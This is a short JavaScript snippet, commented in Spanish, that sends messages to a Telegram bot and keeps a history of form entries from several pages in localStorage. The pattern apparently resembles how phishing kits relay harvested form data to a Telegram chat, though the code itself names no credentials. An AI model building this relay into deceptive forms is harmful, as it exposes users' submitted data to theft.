// Configuración del Bot de Telegram
// REEMPLAZA estos valores con los de tu bot
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';

// Función para enviar datos a Telegram
async function sendToTelegram(message, pageName) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        console.warn('Telegram no configurado. Los datos no se enviarán.');
        return;
    }
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const fullMessage = `📝 ${pageName}\n${message}`;
    
    try {
        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: fullMessage,
                parse_mode: 'HTML'
            })
        });
        console.log('Datos enviados a Telegram');
    } catch (error) {
        console.error('Error enviando a Telegram:', error);
    }
}

// Historial de datos de formularios
let formDataHistory = [];

function saveFormData(page, data) {
    formDataHistory.push({
        page: page,
        data: data,
        timestamp: new Date().toISOString()
    });
    localStorage.setItem('formDataHistory', JSON.stringify(formDataHistory));
}

function collectAllData() {
    const allData = {};
    const history = localStorage.getItem('formDataHistory');
    if (history) {
        formDataHistory = JSON.parse(history);
        formDataHistory.forEach(entry => {
            Object.assign(allData, entry.data);
        });
    }
    return allData;
}